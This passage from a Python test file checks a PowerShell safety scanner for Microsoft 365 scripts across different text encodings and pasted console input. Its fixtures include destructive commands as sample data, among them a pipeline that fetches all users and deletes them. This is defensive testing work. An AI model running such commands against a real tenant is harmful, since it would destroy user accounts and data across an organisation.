    fs = C.check_bytes(b"Get-MgUser\n\x93x\x94 ; Remove-MgUser -UserId x\n", 'cp1252')
    if L[m365check.verdict(fs)] != 'DESTRUCTIVE' or not any('Windows-1252' in f.what for f in fs):
        failures.append('a Windows-1252 script was not read both ways')
    # A UTF-16 file, as ISE saves it, reads the same as UTF-8.
    import tempfile
    with tempfile.TemporaryDirectory() as d:
        u16 = Path(d) / 'u16.ps1'
        u16.write_bytes("Get-MgUser -All\nRemove-MgUser -UserId abc\n".encode('utf-16'))
        if L[m365check.verdict(C.check_file(u16))] != 'DESTRUCTIVE':
            failures.append('UTF-16 script was not read')
    pasted = m365check.PROMPT_PREFIX.sub('', "PS C:\\> Get-MgUser -All |\n>> Remove-MgUser\n")
    if L[m365check.verdict(C.check_text(pasted, 'paste'))] != 'DESTRUCTIVE':
        failures.append('paste: a >> continuation line was not read as part of the pipeline')
    failures += follow_checks()
    failures += pin_checks()
    for f in failures:
        print('FAIL', f)
    print(f'{len(CASES) - sum(1 for f in failures if not f.startswith("Entra"))}/{len(CASES)} corpus cases pass; '
          f'{"Entra fixture ok" if not any(f.startswith("Entra") for f in failures) else "Entra fixture FAILED"}')
    return 1 if failures else 0


if __name__ == '__main__':
    sys.exit(run())
